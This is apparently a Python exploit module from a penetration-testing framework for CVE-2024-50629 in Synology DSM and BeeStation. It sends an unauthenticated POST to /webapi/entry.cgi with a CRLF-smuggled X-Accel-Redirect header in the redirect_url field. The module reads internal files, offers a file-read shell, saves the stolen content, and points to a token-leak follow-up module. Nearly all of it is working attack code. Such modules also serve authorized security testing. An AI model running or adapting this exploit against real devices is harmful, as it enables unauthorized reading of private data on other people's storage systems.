#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Synology DSM/BSM limited file read via RedirectURI X-Accel-Redirect (CVE-2024-50629)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Synology DSM/BSM - File Disclosure via RedirectURI (CVE-2024-50629)',
        'description': (
            'Exploits improper encoding in SYNO.API.Auth.RedirectURI to inject an '
            'X-Accel-Redirect header and read limited internal files (default: '
            'Synology Drive cloud-workerd.log). Works on vulnerable DSM and BeeStation.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2024-50629'],
        'platform': Platform.LINUX,
        'references': [
            'https://www.synology.com/en-global/security/advisory/Synology_SA_24_20',
            'https://www.zerodayinitiative.com/advisories/ZDI-25-211/',
            'https://kiddo-pwn.github.io/blog/2025-11-30/writing-sync-popping-cron',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-50629',
        ],
        'tags': ['synology', 'dsm', 'beestation', 'lfi', 'file-read', 'unauth', 'cve-2024-50629'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/synology_cve_2024_50630_token_leak',
                    'scanner/http/cve_2024_50629_synology_dsm_detect',
                ],
            },
        },
    }
    file_read = OptString(
        '/volume1/@synologydrive/log/cloud-workerd.log',
        'Internal X-Accel-Redirect path to read',
        required=True,
    )
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        accel = str(file_path or '').strip()
        if not accel.startswith('/'):
            accel = '/' + accel
        data = (
            'api=SYNO.API.Auth.RedirectURI&version=1&method=run&session=finder&redirect_url='
            f'https://dsfinder.synology.com/dsm/login?\r\nX-Accel-Redirect:{accel}'
        )
        r = self.http_request(
            method='POST',
            path='/webapi/entry.cgi',
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return ''
        return r.text or ''

    def check(self):
        body = self.execute('/volume1/@synologydrive/log/cloud-workerd.log')
        if not body:
            return {
                'vulnerable': False,
                'reason': 'No content returned from RedirectURI probe',
                'confidence': 'medium',
            }
        if (
            'checkpoint-task.cpp.o' in body
            or 'job-queue-client.cpp.o' in body
            or re.search(r'^[0-9A-Z:-]+ \([0-9]+:[0-9]+\) \[INFO\]', body, re.M)
        ):
            return {
                'vulnerable': True,
                'reason': 'CVE-2024-50629 confirmed: Drive log readable',
                'confidence': 'high',
            }
        if len(body) > 40 and 'success' not in body[:80].lower():
            return {
                'vulnerable': True,
                'reason': 'RedirectURI returned non-API body (possible file disclosure)',
                'confidence': 'medium',
            }
        return {
            'vulnerable': False,
            'reason': 'Response does not look like disclosed file content',
            'confidence': 'medium',
        }

    def run(self):
        if self.shell_lfi:
            print_status('Limited file-read shell via X-Accel-Redirect')
            self.handler_lfi()
            return True

        remote = str(self.file_read or '').strip()
        data = self.execute(remote)
        if not data:
            print_error('File read failed')
            return False

        print_success(f'Read {len(data)} bytes via X-Accel-Redirect:{remote}')
        local = str(self.output_file or '').strip()
        if local:
            try:
                with open(local, 'w', encoding='utf-8', errors='ignore') as fh:
                    fh.write(data)
                print_success(f'Wrote content to {local}')
            except OSError as e:
                print_error(f'Could not write output_file: {e}')
                return False
        else:
            limit = int(self.output_limit or 0)
            print_info(data if not limit or len(data) <= limit else data[:limit] + '\n... [truncated]')
        return True
